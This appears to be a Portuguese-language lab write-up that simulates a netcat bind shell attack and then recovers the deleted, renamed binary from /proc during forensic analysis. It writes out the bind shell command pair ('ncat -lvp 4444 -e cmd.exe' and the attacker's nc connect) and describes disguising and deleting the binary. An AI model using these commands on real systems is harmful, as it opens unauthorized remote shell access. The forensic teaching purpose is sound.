# bind-shell-attack

Nessa atividade foi necessário simular um bind shell attack, e após isso, no computador da vitima, recuperar o arquivo binário deletado desse ataque e analisar esse processo suspeito.

- Nesse ataque de backdoor foi utilizado o netcat, por mais que existam outras maneiras de realizar esse tipom de ataque.

Em um bind shell attack o computador da vítima é capaz de transmitir o executavel do bash, ou cmd, através de uma porta específica, para o computador da pessoa que deseja realizar esse ataque. No caso do netcat o atacante necessita fazer com que a vítima rode uma linha de comandos, transmitindo o bash para o computador do atacante. No caso do bind shell, o computador da vítima fica esperando que o computador de ataque se conecte ao ip e a porta.

Ex:
  C:\Program Files (x86)\Nmap>ncat -lvp 4444 -e cmd.exe  -> computador da vítima 
  
  nc 192.168.56.1 4444 -> computador de ataque
  
Na atividade o netcat abre a porta tcp 41000 e envia informações para /dev/null do computador da vitima. Além disso ele mascara o nome do programa para "freedom",é colocado no diretorio /tmp(arquivos temporários), e após executado é removido, sobrando apenas o seu processo em execução.

![freedom](https://user-images.githubusercontent.com/44793167/96667221-06003680-132f-11eb-868f-c891f98685aa.jpg)

Após isso, na atividade era necessário utilizar o "nestat -nalp" para verificar a porta que esta aberta e o processo que está ocorrendo naquela porta, porém meu netstat não estava funcionando, mas foi possivel ver o processo em execução através do "ps", com o PID 16725.

![ps](https://user-images.githubusercontent.com/44793167/96667414-7018db80-132f-11eb-8ec3-24d72cb90de8.jpg)

Com o PID do nosso processo duvidoso, foi possível ver diversas informações sobre ele:

![info](https://user-images.githubusercontent.com/44793167/96667592-b5d5a400-132f-11eb-9272-0a0897fbe5ba.jpg)

Com isso, foi possivel ver que o arquivo binário do processo foi apagado, e assim foi necessário recuperar o arquivo binário apagado.

- Utilizando o comando:  cp /proc/16725/exe /tmp/recovered_bin
